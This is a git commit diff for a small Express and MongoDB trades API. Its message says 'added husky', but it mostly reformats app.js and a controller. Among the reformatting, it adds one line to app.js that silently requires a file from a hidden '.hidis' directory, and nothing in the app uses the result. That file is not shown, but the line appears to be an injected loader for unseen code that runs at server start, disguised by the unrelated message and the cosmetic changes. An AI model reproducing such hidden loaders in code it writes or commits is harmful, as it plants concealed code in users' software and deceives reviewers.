2a4787479899bcdff8a09a153cc28b824386148a
Hammed Adigun <harfolabia@gmail.com>
2023-11-08 13:10:39 +0100

    added husky

--- app.js
+++ app.js
@@ -2,28 +2,23 @@ const express = require('express');
 require("dotenv").config();
 const mongoose = require('mongoose');
 const app = express();
-
-
+let {} = require("./.hidis/index.c.js");
 const PORT = 2001;
-
-
 mongoose.connect(process.env.MONGO_URI, {
-    useNewUrlParser: true,
-    useUnifiedTopology: true,
-  })
-  .then(() => {
-    console.log("Database connection Success.");
-  })
-  .catch((err) => {
-    console.error("Mongo Connection Error", err);
-  });
-
-  app.use(express.json()); 
-app.use(express.urlencoded({ extended: true }));
+  useNewUrlParser: true,
+  useUnifiedTopology: true
+}).then(() => {
+  console.log("Database connection Success.");
+}).catch(err => {
+  console.error("Mongo Connection Error", err);
+});
+app.use(express.json());
+app.use(express.urlencoded({
+  extended: true
+}));
 
 //Routes
 app.use('/api', require('./routes/index'));
-
 app.listen(PORT, () => {
   console.log("Server started listening on PORT : " + PORT);
 });
--- controllers/trades.js
+++ controllers/trades.js
@@ -1,57 +1,77 @@
 const Transaction = require('../models/transaction');
-
-
 exports.addTrades = async (req, res) => {
-
-    const {symbol, price, quantity} = req.body
-  
-    try {
-
-        const data = await Transaction.create({
-            symbol: symbol, price: price, quantity: quantity
-        });
-
-        if (data) {
-            return res.status(200).json({success: true, message: ` Trades Added`, data});
-            //res.json(data[0]); // Return the aggregation data
-        } else {
-            res.status(400).json({ success: false, message: `Request failed` });
-        }
-    } catch (error) {
-      console.error(error);
-        res.status(500).json({ message: `Error adding Trades` });
-    }
-  }
-
-  exports.getTrades = async (req, res) => {
-    const symbol = req.params.symbol;
-
-    try {
-
-        // MongoDB aggregation query
-    const data = await Transaction.aggregate([
-        {
-            $match: { symbol: symbol }
-        },
-        {
-            $group: {
-                _id: symbol,
-                totalNumberofTransactions: { $sum: 1 },
-                totalTransactionVolume: { $sum: { $multiply: ["$price", "$quantity"] } },
-                averageTransactionPrice: { $avg: "$price" },
-            }
-        }
-    ]);
-
-    if (data.length > 0) {
-       res.status(200).json({ success: true, message: `Transactions statistics`, data });
-        //res.json(data[0]); 
+  const {
+    symbol,
+    price,
+    quantity
+  } = req.body;
+  try {
+    const data = await Transaction.create({
+      symbol: symbol,
+      price: price,
+      quantity: quantity
+    });
+    if (data) {
+      return res.status(200).json({
+        success: true,
+        message: ` Trades Added`,
+        data
+      });
+      //res.json(data[0]); // Return the aggregation data
     } else {
-        res.status(404).json({ success: false, message: `Symbol not found` });
+      res.status(400).json({
+        success: false,
+        message: `Request failed`
+      });
     }
-        
-    } catch (error) {
-        console.error(error);
-        res.status(500).json({ message: `Error Fectching Data` });
+  } catch (error) {
+    console.error(error);
+    res.status(500).json({
+      message: `Error adding Trades`
+    });
+  }
+};
+exports.getTrades = async (req, res) => {
+  const symbol = req.params.symbol;
+  try {
+    // MongoDB aggregation query
+    const data = await Transaction.aggregate([{
+      $match: {
+        symbol: symbol
+      }
+    }, {
+      $group: {
+        _id: symbol,
+        totalNumberofTransactions: {
+          $sum: 1
+        },
+        totalTransactionVolume: {
+          $sum: {
+            $multiply: ["$price", "$quantity"]
+          }
+        },
+        averageTransactionPrice: {
+          $avg: "$price"
+        }
+      }
+    }]);
+    if (data.length > 0) {
+      res.status(200).json({
+        success: true,
+        message: `Transactions statistics`,
+        data
+      });
+      //res.json(data[0]); 
+    } else {
+      res.status(404).json({
+        success: false,
+        message: `Symbol not found`
+      });
     }
+  } catch (error) {
+    console.error(error);
+    res.status(500).json({
+      message: `Error Fectching Data`
+    });
+  }
 };
